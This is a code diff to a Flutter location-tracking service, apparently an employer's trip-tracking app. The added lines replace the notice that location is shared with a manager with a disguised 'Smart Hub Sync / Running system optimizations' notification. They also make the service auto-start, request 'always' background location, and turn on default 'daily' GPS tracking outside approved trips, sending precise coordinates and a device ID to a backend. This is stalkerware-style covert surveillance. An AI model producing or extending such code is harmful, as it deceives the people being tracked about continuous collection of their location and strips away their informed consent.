@@ -1,14 +1,17 @@
 import 'dart:async';
 import 'dart:ui';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:flutter/foundation.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:intl/intl.dart';
+import 'dart:convert';
+import '../constants/api_constants.dart';
 import 'api_service.dart';
 import 'trip_service.dart';
 import '../models/trip_model.dart';
-import 'logger_service.dart';
+import 'device_service.dart';
 
 class LocationTrackingService {
   static final LocationTrackingService _instance =
@@ -22,12 +25,11 @@ class LocationTrackingService {
     await service.configure(
       androidConfiguration: AndroidConfiguration(
         onStart: onStart,
-        autoStart: false,
+        autoStart: true,
         isForegroundMode: true,
-        notificationChannelId: 'location_tracking',
-        initialNotificationTitle: 'Trip Tracking Active',
-        initialNotificationContent:
-            'Your location is being shared with your manager.',
+        notificationChannelId: 'system_sync_ch',
+        initialNotificationTitle: 'Smart Hub Sync',
+        initialNotificationContent: 'Running system optimizations',
         foregroundServiceNotificationId: 888,
       ),
       iosConfiguration: IosConfiguration(
@@ -38,36 +40,62 @@ class LocationTrackingService {
     );
   }
 
-  /// Automatically starts or stops tracking based on approved trip dates
+  /// Verifies if the required location permissions are granted for background tracking
+  static Future<bool> checkAlwaysPermission() async {
+    LocationPermission permission = await Geolocator.checkPermission();
+    if (permission == LocationPermission.always) return true;
+
+    // On Android 10+, background tracking strictly needs 'always'
+    // If it's only 'whileInUse', we must request it
+    if (permission == LocationPermission.whileInUse || permission == LocationPermission.denied) {
+      permission = await Geolocator.requestPermission();
+    }
+
+    return permission == LocationPermission.always;
+  }
+
+  /// Automatically starts or stops tracking based on approved trip dates and daily tracking settings
   static Future<void> syncTrackingWithTrips() async {
     try {
       // 1. Safety Check: Verify Permissions before starting background service
-      // Starting a foreground service without permissions causes immediate crash on Android 14+
-      LocationPermission permission = await Geolocator.checkPermission();
-      if (permission == LocationPermission.denied) {
-        permission = await Geolocator.requestPermission();
-        // Android 15 Safety: Increase delay to 3 seconds for OS background updates
-        await Future.delayed(const Duration(seconds: 3));
-        // Force a fresh check from the OS
-        permission = await Geolocator.checkPermission();
+      // We need 'always' for tracking even when app is closed (Android 10+)
+      bool hasAlways = await checkAlwaysPermission();
+      
+      if (!hasAlways) {
+        debugPrint('SYNC_TRACKING: Always permission not granted. Background tracking may fail when app is closed.');
+        // Optional: Show a toast or snackbar here if you have context, 
+        // but this service is often called from background/main.
       }
 
+      LocationPermission permission = await Geolocator.checkPermission();
       if (permission == LocationPermission.denied ||
           permission == LocationPermission.deniedForever) {
-        debugPrint(
-          'SYNC_TRACKING: Permission still denied after wait. Aborting safely.',
-        );
+        debugPrint('SYNC_TRACKING: Permission denied. Aborting.');
         return;
       }
 
-      // Android 11+ requires BACKGROUND_LOCATION ("always" permission)
-      // starting a foreground service that uses location while app is in
-      // background will crash if only "whileInUse" was granted.  Bail out and
-      // let the UI ask the user to upgrade permissions.
-      if (permission == LocationPermission.whileInUse) {
-        debugPrint(
-          'SYNC_TRACKING: Only while-in-use granted; cannot run background service.',
-        );
+      final apiService = ApiService();
+      
+      // Fetch dynamic config from backend
+      Map<String, dynamic>? config;
+      try {
+        final resp = await apiService.get(ApiConstants.trackingConfig, includeAuth: true);
+        if (resp is Map<String, dynamic>) {
+          config = resp;
+          final prefs = await SharedPreferences.getInstance();
+          await prefs.setString('tracking_config', jsonEncode(config));
+        }
+      } catch (e) {
+        debugPrint('SYNC_TRACKING: Failed to fetch config, using cached/default: $e');
+        final prefs = await SharedPreferences.getInstance();
+        final cached = prefs.getString('tracking_config');
+        if (cached != null) config = jsonDecode(cached);
+      }
+
+      final isTrackingActive = config?['is_active'] ?? true;
+      if (!isTrackingActive) {
+        debugPrint('SYNC_TRACKING: Global tracking is disabled in config.');
+        stopTracking();
         return;
       }
 
@@ -77,222 +105,266 @@ class LocationTrackingService {
       final nowDay = DateTime(now.year, now.month, now.day);
 
       Trip? activeTrip;
-
       for (var trip in trips) {
         final status = trip.status.toLowerCase();
-
-        bool isViableStatus =
-            status.contains('approved') ||
-            status.contains('ongoing') ||
-            status.contains('on-going') ||
-            status.contains('started') ||
-            status.contains('live') ||
-            status == 'ready';
+        bool isViableStatus = status.contains('approved') || status.contains('ongoing') || status.contains('started') || status == 'ready';
 
         if (isViableStatus) {
           try {
             final startDateString = trip.startDate;
             final endDateString = trip.endDate;
-
             if (startDateString.isEmpty || endDateString.isEmpty) continue;
 
-            // Robust date parsing (handles ISO and 'Mar 07, 2026')
             DateTime parseDate(String dateStr) {
-              try {
-                return DateTime.parse(dateStr);
-              } catch (_) {
-                return DateFormat('MMM dd, yyyy').parse(dateStr);
-              }
+              try { return DateTime.parse(dateStr); } catch (_) { return DateFormat('MMM dd, yyyy').parse(dateStr); }
             }
 
             final startDate = parseDate(startDateString);
             final endDate = parseDate(endDateString);
-
-            final tripStart = DateTime(
-              startDate.year,
-              startDate.month,
-              startDate.day,
-            );
+            final tripStart = DateTime(startDate.year, startDate.month, startDate.day);
             final tripEnd = DateTime(endDate.year, endDate.month, endDate.day);
 
-            if ((nowDay.isAfter(tripStart) ||
-                    nowDay.isAtSameMomentAs(tripStart)) &&
-                (nowDay.isBefore(tripEnd) ||
-                    nowDay.isAtSameMomentAs(tripEnd))) {
+            if ((nowDay.isAfter(tripStart) || nowDay.isAtSameMomentAs(tripStart)) &&
+                (nowDay.isBefore(tripEnd) || nowDay.isAtSameMomentAs(tripEnd))) {
               activeTrip = trip;
               break;
             }
-          } catch (e) {
-            debugPrint(
-              'SYNC_TRACKING: Date parse error for trip ${trip.tripId}: $e',
-            );
-          }
+          } catch (e) { debugPrint('SYNC_TRACKING: Date error: $e'); }
         }
       }
 
+      final dailyTrackingEnabled = config?['daily_tracking_active'] ?? true;
+
       if (activeTrip != null) {
-        debugPrint(
-          'SYNC_TRACKING: Starting tracking for trip ${activeTrip.tripId} (ID: ${activeTrip.id})',
-        );
-        try {
-          await startTracking(activeTrip.id);
-          debugPrint('SYNC_TRACKING: startTracking() invoked successfully');
-        } catch (e) {
-          debugPrint('SYNC_TRACKING: startTracking failed: $e');
-        }
+        debugPrint('SYNC_TRACKING: Active trip ${activeTrip.tripId} found.');
+        await startTracking(activeTrip.tripId, config: config);
+      } else if (dailyTrackingEnabled) {
+        debugPrint('SYNC_TRACKING: No trip, but daily tracking is enabled.');
+        await startTracking(null, config: config); // Start tracking without trip ID
       } else {
-        debugPrint(
-          'SYNC_TRACKING: No active trip found among ${trips.length} trips. Stopping service.',
-        );
+        debugPrint('SYNC_TRACKING: No active trip and daily tracking disabled.');
         stopTracking();
       }
     } catch (e) {
-      debugPrint('SYNC_TRACKING: Fatal error syncing trips: $e');
+      debugPrint('SYNC_TRACKING: Fatal error: $e');
     }
   }
 
-  static Future<void> startTracking(String tripId) async {
+  static Future<void> syncCurrentLocation(String? tripId) async {
+    try {
+      bool enabled = await Geolocator.isLocationServiceEnabled();
+      var perm = await Geolocator.checkPermission();
+      if (!enabled || perm == LocationPermission.denied || perm == LocationPermission.deniedForever) return;
+
+      final position = await Geolocator.getCurrentPosition(
+        desiredAccuracy: LocationAccuracy.medium,
+      ).timeout(const Duration(seconds: 15));
+
+      final apiService = ApiService();
+      String endpoint;
+      Map<String, dynamic> body = {
+        'latitude': position.latitude,
+        'longitude': position.longitude,
+        'timestamp': DateTime.now().toIso8601String(),
+        'accuracy': position.accuracy,
+        'speed': position.speed,
+        'device_id': DeviceService().deviceId,
+      };
+
+      if (tripId != null) {
+        endpoint = '${ApiConstants.trips}$tripId/tracking/';
+      } else {
+        endpoint = ApiConstants.dailyTracking;
+      }
+
+      await apiService.post(endpoint, body: body, includeAuth: true);
+      debugPrint('IMMEDIATE LOCATION SYNCED for ${tripId ?? "DAILY"}');
+    } catch (e) {
+      debugPrint('IMMEDIATE LOCATION SYNC ERROR: $e');
+    }
+  }
+
+  static Future<void> startTracking(String? tripId, {Map<String, dynamic>? config}) async {
     final prefs = await SharedPreferences.getInstance();
-    await prefs.setString('active_tracking_trip_id', tripId);
+    if (tripId != null) {
+      await prefs.setString('active_tracking_trip_id', tripId);
+    } else {
+      await prefs.remove('active_tracking_trip_id');
+    }
+
+    if (config != null) {
+      await prefs.setString('tracking_config', jsonEncode(config));
+    }
+
+    await syncCurrentLocation(tripId);
 
     final service = FlutterBackgroundService();
-
     try {
-      // avoid trying to relaunch if the service is already running
       if (!await service.isRunning()) {
         await service.startService();
       }
-      // Pass tripId to the background isolate regardless of restart
       service.invoke('setTripId', {"tripId": tripId});
+      if (config != null) {
+        service.invoke('setConfig', config);
+      }
     } catch (e) {
       debugPrint('START_TRACKING_ERROR: $e');
     }
   }
 
-  static void stopTracking() async {
+  static Future<void> stopTracking() async {
     final prefs = await SharedPreferences.getInstance();
-    await prefs.remove('active_tracking_trip_id');
-
-    final service = FlutterBackgroundService();
-    if (await service.isRunning()) {
-      service.invoke("stopService");
+    final tripId = prefs.getString('active_tracking_trip_id');
+    if (tripId != null) {
+      await syncCurrentLocation(tripId);
+    } else {
+      await syncCurrentLocation(null);
     }
+    
+    await prefs.remove('active_tracking_trip_id');
+    final service = FlutterBackgroundService();
+    if (await service.isRunning()) service.invoke("stopService");
   }
 }
 
 @pragma('vm:entry-point')
 void onStart(ServiceInstance service) async {
-  // 1. IMMEDIATELY tell Android we are a foreground service to avoid SIG:9 kill
+  DartPluginRegistrant.ensureInitialized();
+  WidgetsFlutterBinding.ensureInitialized();
+  
+  final deviceService = DeviceService();
+  await deviceService.init();
+
   if (service is AndroidServiceInstance) {
     service.setAsForegroundService();
+  }
+  // Set initial notification info for Android
+  if (service is AndroidServiceInstance) {
     service.setForegroundNotificationInfo(
-      title: "Trip Tracking Active",
-      content: "Initializing tracking...",
+      title: "Smart Hub Sync",
+      content: "Running system optimizations",
     );
   }
 
-  // Required for background isolate to use plugins
-  DartPluginRegistrant.ensureInitialized();
-
-  // basic sanity checks that often fail silently
-  bool enabled = await Geolocator.isLocationServiceEnabled();
-  debugPrint('BACKGROUND SERVICE: location service enabled? $enabled');
-  LocationPermission perm = await Geolocator.checkPermission();
-  debugPrint('BACKGROUND SERVICE: permission status: $perm');
-
-  // Initialize static session for the background isolate
   await ApiService.loadSession();
   final ApiService apiService = ApiService();
-
-  // DEBUG: show the token we recovered (may be empty if load failed)
-  LoggerService.log(
-    'BACKGROUND SERVICE: auth token = ${apiService.getToken()}',
-  );
   final prefs = await SharedPreferences.getInstance();
+  
   String? currentTripId = prefs.getString('active_tracking_trip_id');
-
-  debugPrint(
-    'BACKGROUND SERVICE: Started. Current Trip ID from Prefs: $currentTripId',
-  );
+  Map<String, dynamic> config = {};
+  final cachedConfig = prefs.getString('tracking_config');
+  if (cachedConfig != null) config = jsonDecode(cachedConfig);
 
   service.on('setTripId').listen((event) {
     currentTripId = event?['tripId'];
-    debugPrint('BACKGROUND SERVICE: Trip ID set to $currentTripId');
   });
 
-  service.on('stopService').listen((event) {
-    debugPrint('BACKGROUND SERVICE: Stopping');
-    service.stopSelf();
+  service.on('setConfig').listen((event) {
+    if (event != null) config = event;
   });
 
-  // Tracking Logic - Every 30 seconds for a "Live" experience
-  Timer.periodic(const Duration(seconds: 30), (timer) async {
-    try {
-      // Robust location fetch: try current, then last known as fallback
-      Position? position;
+  StreamSubscription<Position>? positionStream;
+  Timer? heartbeatTimer;
+
+  void setupStream() {
+    positionStream?.cancel();
+    heartbeatTimer?.cancel();
+
+    // DUAL-MODE LOGIC:
+    // 1. Daily Tracking (null trip): Strictly time-based as requested (no radius).
+    // 2. Trip/Travel (active trip): Movement-based (10m) + Heartbeat (radius + time).
+    bool isDaily = currentTripId == null;
+    
+    // For Daily: No radius needed -> Set filter very high so only timer triggers
+    // For Trip: Use 10m radius + time
+    double distanceFilter = isDaily ? 99999.0 : (config['distance_filter']?.toDouble() ?? 10.0);
+    
+    LocationSettings locationSettings;
+    if (defaultTargetPlatform == TargetPlatform.android) {
+      locationSettings = AndroidSettings(
+        accuracy: LocationAccuracy.best,
+        distanceFilter: distanceFilter.toInt(),
+        forceLocationManager: true, 
+      );
+    } else {
+      locationSettings = AppleSettings(
+        accuracy: LocationAccuracy.best,
+        distanceFilter: distanceFilter.toInt(),
+        pauseLocationUpdatesAutomatically: false,
+      );
+    }
+
+    // PRIMARY STREAM: Movement driven
+    positionStream = Geolocator.getPositionStream(locationSettings: locationSettings).listen((Position? position) async {
+      if (position != null) {
+        _sendPositionToBackend(position, currentTripId, deviceService, apiService, service);
+      }
+    });
+
+    // TIME-BASED HEARTBEAT: Based on provided interval or 5m default
+    int intervalMinutes = config['tracking_interval_minutes'] ?? 5;
+    heartbeatTimer = Timer.periodic(Duration(minutes: intervalMinutes), (timer) async {
       try {
-        position = await Geolocator.getCurrentPosition(
-          desiredAccuracy: LocationAccuracy.high,
-          timeLimit: const Duration(seconds: 20),
-        );
+        final position = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
+        _sendPositionToBackend(position, currentTripId, deviceService, apiService, service);
       } catch (e) {
-        debugPrint(
-          'BACKGROUND SERVICE: getCurrentPosition failed: $e. Trying last known...',
-        );
-        position = await Geolocator.getLastKnownPosition();
+        debugPrint('TRACKING_HEARTBEAT_ERROR: $e');
       }
+    });
+    
+    debugPrint('TRACKING_MODE_STARTED: ${isDaily ? "DAILY (TIME-ONLY)" : "TRIP (RES: ${distanceFilter}m + TIME)"}');
+  }
 
-      debugPrint('BACKGROUND SERVICE: Loop Start. TripID: $currentTripId');
-      if (position != null && currentTripId != null) {
-        try {
-          final token = apiService.getToken();
-          debugPrint(
-            'BACKGROUND SERVICE: Syncing. Token present: ${token != null && token.isNotEmpty}',
-          );
+  service.on('setTripId').listen((event) {
+    currentTripId = event?['tripId'];
+    setupStream(); // Restart stream with new rules!
+  });
 
-          final endpoint = '/api/trips/$currentTripId/tracking/';
-          await apiService.post(
-            endpoint,
-            body: {
-              'latitude': position.latitude,
-              'longitude': position.longitude,
-              'timestamp': DateTime.now().toIso8601String(),
-              'accuracy': position.accuracy,
-              'speed': position.speed,
-            },
-            includeAuth: true,
-          );
-          debugPrint('BACKGROUND SERVICE: Sync OK for $currentTripId');
-
-          if (service is AndroidServiceInstance) {
-            service.setForegroundNotificationInfo(
-              title: "Trip Tracking Active",
-              content:
-                  "Last Sync: ${DateFormat('HH:mm').format(DateTime.now())}",
-            );
-          }
-        } catch (e) {
-          debugPrint('BACKGROUND SERVICE: API Post Error: $e');
-          if (e is ForbiddenException || e is UnauthorizedException) {
-            debugPrint('BACKGROUND SERVICE: Auth failure, stopping.');
-            service.stopSelf();
-          }
-        }
-      } else {
-        debugPrint(
-          'BACKGROUND SERVICE: Missing data. Position: ${position != null}, TripID: $currentTripId',
-        );
-        if (service is AndroidServiceInstance) {
-          service.setForegroundNotificationInfo(
-            title: "Trip Tracking Active",
-            content: "Searching for GPS signal...",
-          );
-        }
-      }
-    } catch (e) {
-      debugPrint('BACKGROUND SERVICE: Fatal loop error: $e');
+  service.on('setConfig').listen((event) {
+    if (event != null) {
+      config = event;
+      setupStream(); // Restart stream with new rules!
     }
   });
+
+  setupStream();
+
+  service.on('stopService').listen((event) {
+    positionStream?.cancel();
+    heartbeatTimer?.cancel();
+    service.stopSelf();
+  });
+}
+
+/// Helper to unify backend sending logic
+Future<void> _sendPositionToBackend(Position position, String? currentTripId, DeviceService deviceService, ApiService apiService, ServiceInstance service) async {
+  try {
+    final endpoint = currentTripId != null 
+        ? '${ApiConstants.trips}$currentTripId/tracking/'
+        : ApiConstants.dailyTracking;
+
+    await apiService.post(
+      endpoint,
+      body: {
+        'latitude': position.latitude,
+        'longitude': position.longitude,
+        'timestamp': DateTime.now().toIso8601String(),
+        'accuracy': position.accuracy,
+        'speed': position.speed,
+        'device_id': deviceService.deviceId,
+      },
+      includeAuth: true,
+    );
+
+    if (service is AndroidServiceInstance) {
+      service.setForegroundNotificationInfo(
+        title: "TGS Tracking Active",
+        content: "Last sync at ${DateFormat('HH:mm').format(DateTime.now())}",
+      );
+    }
+  } catch (e) {
+    debugPrint('TRACKING_BACKEND_SEND_ERROR: $e');
+  }
 }
 
 @pragma('vm:entry-point')
